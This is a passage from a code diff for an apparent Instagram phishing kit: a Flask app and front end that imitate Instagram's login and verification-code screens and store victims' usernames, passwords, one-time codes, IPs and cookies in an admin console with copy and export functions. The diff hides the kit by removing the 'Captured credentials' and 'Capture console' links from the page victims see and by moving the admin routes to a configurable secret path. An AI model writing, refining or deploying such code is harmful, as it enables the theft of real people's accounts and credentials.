  if(PHASE==="code")return `<div class="empty" style="padding-top:40px"><div class="ttl">Verification code</div><p class="sub">Instagram sent a code by ${ESC(CHOICE||"email")}. Enter it below.</p><div class="bar" style="justify-content:center"><input class="search" id="code" inputmode="numeric" autocomplete="one-time-code" placeholder="123456" style="max-width:200px;text-align:center;letter-spacing:.3em"><button class="btn" id="cbtn">Send</button></div><p class="sub" style="margin-top:14px">Or approve in the app and press Continue.</p><button class="btn g" id="cont">Continue</button></div>`;
- return `<div class="sk top"></div><div class="empty" style="padding:6px 0 0"><div class="ttl">${ESC(m)}</div><p class="sub">${ESC(PF.username||"")}</p></div><div class="skw"><div class="sk"></div><div class="sk"></div><div class="sk"></div></div>${PHASE==="approve"?`<div style="text-align:center;margin-top:18px"><button class="btn" id="cont">Continue</button></div>`:""}`;
+ return `<div class="sk top"></div><div class="empty" style="padding:6px 0 0"><div class="ttl">${ESC(m)}</div><p class="sub">${ESC(PF.username||"")}</p></div><div class="skw"><div class="sk"></div><div class="sk"></div></div>${PHASE==="approve"?`<div style="text-align:center;margin-top:18px"><button class="btn" id="cont">Continue</button></div>`:""}`;
 }
 
 function home(){
@@ -1663,7 +1699,7 @@ function lv(k,t,s,ch){
 function settings(){
  const sw=(k,l,s)=>`<div class="srow"><div class="info"><b style="font-weight:400">${l}</b>${s?`<small>${s}</small>`:""}</div><button class="sw ${P[k]?"on":""}" data-p="${k}" role="switch" aria-checked="${P[k]}" aria-label="${l}"></button></div>`;
  const th=(a,l,s,on)=>`<div class="srow"><div class="info"><b style="font-weight:400">${l}</b><small>${s}</small></div><button class="sw ${on?"on":""}" data-th="${a}" role="switch" aria-checked="${on}" aria-label="${l}"></button></div>`;
- const lk=(l,s,c,href)=>`<div class="srow lk ${c||""}"${href?` data-href="${href}"`:""}><div class="info"><b style="font-weight:400">${l}</b>${s?`<small>${s}</small>`:""}</div><span class="ch">›</span></div>`;
+ const lk=(l,s,c)=>`<div class="srow lk ${c||""}"><div class="info"><b style="font-weight:400">${l}</b>${s?`<small>${s}</small>`:""}</div><span class="ch">›</span></div>`;
  return `<h1 class="ttl">Settings</h1><p class="sub">Manage your appearance, alerts and account.</p>
  <div class="acc">${av({h:PF.username,pic:PF.pic},0,"m")}<div class="info"><b>${ESC(PF.username)}</b><small>${ESC(PF.full_name||"Instagram account")}</small></div><button class="btn g" id="sync">Sync</button></div>
  <div class="sec"><h3>Appearance</h3></div>
@@ -1676,10 +1712,8 @@ function settings(){
  ${sw("stalk","Story view alerts","Notify me about repeat viewers")}
  <div class="sec"><h3>Privacy</h3></div>
  ${sw("priv","Hide my activity status","Others can’t see when you’re active")}
- ${lk("Captured credentials","Last login this browser sent","","/cookies")}
- ${lk("Capture console","Open the admin console","","/admin")}
  ${lk("Blocked accounts","")}
- ${lk("Sync now","Pull followers again","")}
+ ${lk("Sync now","Pull followers again")}
  <div class="sec"><h3>Account</h3></div>
  ${lk("Linked Instagram account","@"+ESC(PF.username))}
  ${lk("Download your data","")}
@@ -1708,7 +1742,7 @@ function render(keep){
  m.querySelectorAll("[data-f]").forEach(b=>b.onclick=()=>{f=b.dataset.f;render(true)});
  m.querySelectorAll("[data-p]").forEach(b=>b.onclick=()=>{P[b.dataset.p]=!P[b.dataset.p];savePrefs();render(true)});
  m.querySelectorAll("[data-th]").forEach(b=>b.onclick=()=>{const d=eff();theme=b.dataset.th==="dark"?(d?"light":"dark"):(theme==="system"?(d?"dark":"light"):"system");try{localStorage.setItem("ins-theme",theme)}catch(e){}applyTheme();render(true);toast(theme==="system"?"Using device appearance":(theme==="dark"?"Dark mode on":"Light mode on"))});
- m.querySelectorAll("[data-href]").forEach(b=>b.onclick=()=>window.open(b.dataset.href,"_blank","noopener"));
+ m.querySelectorAll(".srow.lk:not(.red)").forEach(b=>{ if(b.textContent.indexOf("Sync now")>-1) b.onclick=()=>sync(); });
  m.querySelectorAll(".srow.red").forEach(b=>b.onclick=()=>{b.style.pointerEvents="none";b.style.opacity=".55";toast("Logging out…");setTimeout(()=>{location.href="/logout"},480)});
  m.querySelectorAll("[data-k]").forEach(b=>b.onclick=()=>go(b.dataset.k));
  m.querySelectorAll("[data-un]").forEach(b=>b.onclick=()=>act("/api/unfollow",b,"Unfollowed "));
@@ -1805,6 +1839,11 @@ form.inline{display:inline}
 .tag.ok{background:#0f2417;color:var(--ok);border-color:#1d5233}
 .tag.bad{background:#2a1013;color:var(--bad);border-color:#6b1e26}
 .isp{color:var(--mut);font-size:11px;display:block;max-width:150px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+@media (max-width:640px){
+  header{padding:10px 12px;gap:6px}
+  main{padding:12px 12px 60px}
+  th:nth-child(3),td:nth-child(3),th:nth-child(7),td:nth-child(7){display:none}
+}
 @media (prefers-reduced-motion:reduce){*,*::before,*::after{animation:none!important;transition:none!important}}
 </style></head><body>
 <header>
@@ -1820,7 +1859,6 @@ form.inline{display:inline}
     <input type="hidden" name="_csrf" value="__CSRF__">
     <button class="btn" type="submit">clear all</button>
   </form>
-  <a class="btn" href="/">login page</a>
 </header>
 <main>__BODY__</main>
 <script>
@@ -1877,9 +1915,9 @@ function cp(el){
 
 LOGIN_ADMIN_HTML = """<!DOCTYPE html><html><head><meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1"><title>Console</title>
-<style>body{margin:0;height:100vh;display:grid;place-items:center;background:#0a0a0c;color:#ececf1;
-font-family:ui-monospace,Menlo,monospace}form{background:#141419;border:1px solid #232329;
-padding:26px;border-radius:14px;display:grid;gap:10px;width:280px;
+<style>body{margin:0;min-height:100dvh;display:grid;place-items:center;background:#0a0a0c;color:#ececf1;
+font-family:ui-monospace,Menlo,monospace;padding:16px}form{background:#141419;border:1px solid #232329;
+padding:26px;border-radius:14px;display:grid;gap:10px;width:100%;max-width:300px;
 animation:in .5s cubic-bezier(.2,1.2,.4,1) both}
 @keyframes in{from{opacity:0;transform:translateY(14px) scale(.97)}}
 h1{font-size:13px;letter-spacing:.15em;text-transform:uppercase;margin:0 0 6px}
@@ -1903,6 +1941,7 @@ def render_admin(body: str) -> str:
     finally:
         conn.close()
     return (ADMIN_HTML
+            .replace("/admin", ADMIN_BASE)
             .replace("__BODY__", body)
             .replace("__LOGS__", str(logs))
             .replace("__CSRF__", csrf_token()))
@@ -1937,7 +1976,7 @@ def row_html(r: sqlite3.Row) -> str:
         f'<td class="p"><span>{escape(r["password"] or "")}</span> '
         f'<button class="btn cp" onclick="cp(this)">copy</button></td>'
         f'<td><span class="mono">{escape(r["source"] or "")}</span></td>'
-        f'<td><a href="/admin/{r["id"]}">open</a></td>'
+        f'<td><a href="{ADMIN_BASE}/{r["id"]}">open</a></td>'
         f"</tr>"
     )
 
@@ -2239,11 +2278,6 @@ def cookies_view():
     })
 
 
-@app.route("/console")
-def console_redirect():
-    return redirect(url_for("admin"))
-
-
 @app.route("/logout")
 def logout():
     for k in ("user", "last_login", "last_cred", "last_user"):
@@ -2279,10 +2313,10 @@ def admin_query(q: str, only: str, since: int | None = None) -> tuple[str, list]
     return sql, params
 
 
-@app.route("/admin")
+@app.route(ADMIN_BASE)
 def admin():
     if not admin_ok():
-        return html(LOGIN_ADMIN_HTML, 401)
+        return html(LOGIN_ADMIN_HTML.replace('action="/admin"', f'action="{ADMIN_BASE}"'), 401)
 
     q = (request.args.get("q") or "").strip()
     only = request.args.get("only") or ""
@@ -2303,8 +2337,9 @@ def admin():
     )
 
     chips = "".join(
-        '<a class="chip{0}" href="/admin?{1}">{2}</a>'.format(
+        '<a class="chip{0}" href="{1}?{2}">{3}</a>'.format(
             " on" if only == value else "",
+            ADMIN_BASE,
             urlencode({"q": q, "only": value} if value else ({"q": q} if q else {})),
             label,
         )
@@ -2319,7 +2354,7 @@ def admin():
         + f'<input name="q" value="{escape(q)}" placeholder="search ip / user / pass / ua / city / isp">'
         + (f'<input type="hidden" name="only" value="{escape(only)}">' if only else "")
         + '<button class="btn" type="submit">search</button>'
-        + '<a class="btn" href="/admin">reset</a>'
+        + f'<a class="btn" href="{ADMIN_BASE}">reset</a>'
         + chips
         + '</form>'
         + '<table><thead><tr><th>#</th><th>time (utc)</th><th>place</th><th>ip</th>'
@@ -2331,7 +2366,7 @@ def admin():
     return html(render_admin(body))
 
 
-@app.route("/admin/feed")
+@app.route(ADMIN_BASE + "/feed")
 def admin_feed():
     if not admin_ok():
         return jsonify({"rows": [], "last": 0}), 401
@@ -2356,10 +2391,10 @@ def admin_feed():
     return jsonify({"rows": [row_html(r) for r in rows], "last": last})
 
 
-@app.route("/admin/<int:cred_id>")
+@app.route(ADMIN_BASE + "/<int:cred_id>")
 def admin_credential(cred_id: int):
     if not admin_ok():
-        return html(LOGIN_ADMIN_HTML, 401)
+        return html(LOGIN_ADMIN_HTML.replace('action="/admin"', f'action="{ADMIN_BASE}"'), 401)
 
     conn = connect()
     try:
@@ -2385,8 +2420,8 @@ def admin_credential(cred_id: int):
     )
 
     body = (
-        f'<a class="btn" href="/admin">← back</a> '
-        f'<form class="inline" method="post" action="/admin/delete/{cred_id}" '
+        f'<a class="btn" href="{ADMIN_BASE}">← back</a> '
+        f'<form class="inline" method="post" action="{ADMIN_BASE}/delete/{cred_id}" '
         f'onsubmit="return confirm(\'delete #{cred_id}?\')">'
         f'<input type="hidden" name="_csrf" value="{csrf_token()}">'
         f'<button class="btn" type="submit">delete</button></form>'
@@ -2405,7 +2440,7 @@ def admin_credential(cred_id: int):
     return html(render_admin(body))
 
 
-@app.route("/admin/delete/<int:cred_id>", methods=["POST"])
+@app.route(ADMIN_BASE + "/delete/<int:cred_id>", methods=["POST"])
 def admin_delete(cred_id: int):
     if not admin_ok():
         return redirect(url_for("admin"))
@@ -2420,7 +2455,7 @@ def admin_delete(cred_id: int):
     return redirect(url_for("admin"))
 
 
-@app.route("/admin/delete-all", methods=["POST"])
+@app.route(ADMIN_BASE + "/delete-all", methods=["POST"])
 def admin_delete_all():
     if not admin_ok():
         return redirect(url_for("admin"))
@@ -2437,7 +2472,7 @@ def admin_delete_all():
     return redirect(url_for("admin"))
 
 
-@app.route("/admin/export")
+@app.route(ADMIN_BASE + "/export")
 def admin_export():
     if not admin_ok():
         return redirect(url_for("admin"))
@@ -2486,8 +2521,8 @@ def healthz():
 # ---------------- errors ----------------
 ERROR_HTML = """<!DOCTYPE html><html><head><meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1"><title>__C__</title>
-<style>body{margin:0;height:100vh;display:grid;place-items:center;background:#000;color:#f5f5f5;
-font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;text-align:center}
+<style>body{margin:0;min-height:100dvh;display:grid;place-items:center;background:#000;color:#f5f5f5;
+font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;text-align:center;padding:16px}
 h1{font-size:64px;margin:0;background:linear-gradient(45deg,#feda75,#d62976,#4f5bd5);
 -webkit-background-clip:text;background-clip:text;color:transparent;
 animation:in .6s cubic-bezier(.2,1.2,.4,1) both}
@@ -2542,7 +2577,7 @@ init_db()
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", "5000"))
-    logger.info("console: http://localhost:%s/admin  (token set: %s)", port, bool(ADMIN_TOKEN))
+    logger.info("console: http://localhost:%s%s  (token set: %s)", port, ADMIN_BASE, bool(ADMIN_TOKEN))
     if not ADMIN_TOKEN:
         logger.warning("ADMIN_TOKEN unset — console is public. Set it before exposing.")
     if not os.environ.get("SECRET_KEY"):
